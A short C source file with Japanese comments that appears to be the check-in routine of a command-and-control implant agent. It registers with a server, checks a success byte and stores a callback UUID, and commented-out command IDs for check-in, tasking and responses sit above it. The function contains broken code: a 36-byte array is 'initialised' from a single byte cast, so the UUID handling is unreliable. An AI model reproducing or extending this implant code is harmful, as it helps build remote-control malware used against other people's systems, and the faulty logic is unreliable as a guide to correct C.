#include "checkin.h"

// TODO:commandIDをtranlaterと一致させる。

//comandID =
/*
#define CMD_CHECKIN     0x01
#define CMD_GET_TASKING 0x04
#define CMD_RESPONSE    0x05
*/


BOOL sendCheckin(PCONFIG_CORN corn){
    // ! メモリを確保
    PPackage Checkin = newPackage(TRUE, checkin);

    // ! メモリ確保
    PParser response = sendAndReceive(Checkin->buffer, Checkin->size);

    // ! Packageメモリ解放
    freePackage(Checkin);

    if(!response){
        return FALSE;
    }

    SIZE_T szSuccess = 1;
    SIZE_T szCallBackUUID = 36;

    if(getByte(response, &szSuccess) == 0x00){
        // ! エラー時にメモリ解放
        freeParser(response);
        return FALSE;
    }

    CHAR callBackUUID[36] = (CHAR)getByte(response, &szCallBackUUID);
    memcpy(corn->callBackuuid, callBackUUID, 36);
    
    // ! メモリ解放
    freeParser(response);

    return TRUE;
}

